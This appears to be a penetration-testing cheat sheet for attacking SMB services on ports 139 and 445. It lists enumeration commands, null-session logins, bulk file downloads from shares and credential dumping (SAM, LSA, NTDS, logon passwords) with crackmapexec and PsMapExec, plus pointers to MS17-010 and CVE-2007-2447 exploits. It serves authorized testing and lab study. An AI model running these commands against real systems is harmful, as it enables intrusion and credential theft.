# Ports 139 | 445 | SMB

## Enumeration

Identify SMB running on a host. List only open ports.

```bash
sudo nmap -sT -sU -sV -p135,137,138,139,445 --open <IP>
```

## Nmap Scripts

```bash
# Enumerate shares
nmap --script smb-enum-shares -p 445 <IP>
# OS Discovery
nmap --script smb-os-discovery -p 445 <IP>
# Enumerate Users
nmap --script=smb-enum-users -p 445 <IP>
# All
nmap --script=smb-enum-users,smb-enum-shares,smb-os-discovery -p 139,445 <IP>
```

## NULL / Anonymous Login

```bash
# On some configuration omitting '-N' will grant access.
smbclient -U '' -L \\\\<IP> 

smbclient -U '' -N -L \\\\<IP> 
smbclient -U '%' -N -L \\\\<IP>
smbclient -U '%' -N \\\\<IP>\\<Folder>

# Enter a random username with no password and try for anonymous login.
crackmapexec smb <IP> -u 'anonymous' -p ''

crackmapexec smb <IP> -u '' -p ''
crackmapexec smb <IP> -u '' -p '' --shares
```

## Authenticated

```bash
# smbmap, list shares and view permissions
smbmap -H <IP> -u <User> -p <Password>

# Connect to share as user and prompt for password
smbclient -U <User> \\\\<IP>\\<Share>
```

## Download Files

```bash
# Grab everything in a share
smbclient '\\<IP>\<Share>' -N -c 'prompt OFF;recurse ON; mget *'

# Recursive pattern search for candidate files to download
smbmap -H <IP> -u <User> -p <Password> -d <Domain> -R -A "pass*" --depth 20  
smbmap -H <IP> -u <User> -p <Password> -d <Domain> -R -A ".txt|.log|.ps1|.vbs|.zip|.xml"
```

## Tools

### Enum4Linux

Run batch commands against a target.

```bash
enum4linux -a -u '' -p '' <IP>
```

### Crackmapexec

Command execution and enumeration from Linux

```markup
crackmapexec smb <IP> -u <User> -p <Password> --disks
crackmapexec smb <IP> -u <User> -p <Password> --groups
crackmapexec smb <IP> -u <User> -p <Password> --lsa
crackmapexec smb <IP> -u <User> -p <Password> --local-groups
crackmapexec smb <IP> -u <User> -p <Password> --loggedon-users
crackmapexec smb <IP> -u <User> -p <Password> --pass-pol
crackmapexec smb <IP> -u <User> -p <Password> --rid-brute
crackmapexec smb <IP> -u <User> -p <Password> --sam
crackmapexec smb <IP> -u <User> -p <Password> --sessions
crackmapexec smb <IP> -u <User> -p <Password> --users
crackmapexec smb <IP> -u <User> -p <Password> --loggedon-users --sessions --users --groups --local-groups --pass-pol --sam --rid-brute 2000
```

### PsMapExec

Command execution and enumeration from Windows

```powershell
PsMapExec -Method SMB -Targets [IP] -Username [User] -Password [Pass] -Module Disks
PsMapExec -Method SMB -Targets [IP] -Username [User] -Password [Pass] -Module KerbDump
PsMapExec -Method SMB -Targets [IP] -Username [User] -Password [Pass] -Module LSA
PsMapExec -Method SMB -Targets [IP] -Username [User] -Password [Pass] -Module LogonPasswords
PsMapExec -Method SMB -Targets [IP] -Username [User] -Password [Pass] -Module NTDS
PsMapExec -Method SMB -Targets [IP] -Username [User] -Password [Pass] -Module SAM
PsMapExec -Method SMB -Targets [IP] -Username [User] -Password [Pass] -Module Sessoions
```

## User Enumeration

### Nmap

```bash
# Nmap
nmap --script=smb-enum-users -p 445 <IP>

# Metasploit
use auxiliary/scanner/smb/smb_enumusers

# Crackmapexec
crackmapexec smb 10.10.82.202 -u '' -p '' --users --rid-brute | grep '(SidTypeUser)'

# Enum4Linux
enum4linux -u '' -p '' -r <IP> | grep "Local User"
enum4linux -u '' -p ''-r <IP> | grep "Local Group"
```

![](<../../.gitbook/assets/image (1860).png>)

## Exploits

```bash
nmap --script smb-vuln-ms17-010 -p 445 <IP>
```

### Samba

#### CVE-2007-2447 [Samba Symlink Directory Traversal](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)

| Platform   | Link                                                                                   |
| ---------- | -------------------------------------------------------------------------------------- |
| Metasploit | auxiliary/admin/smb/samba\_symlink\_traversal                                          |
| GitHub     | [https://github.com/amriunix/CVE-2007-2447](https://github.com/amriunix/CVE-2007-2447) |

####

####

####
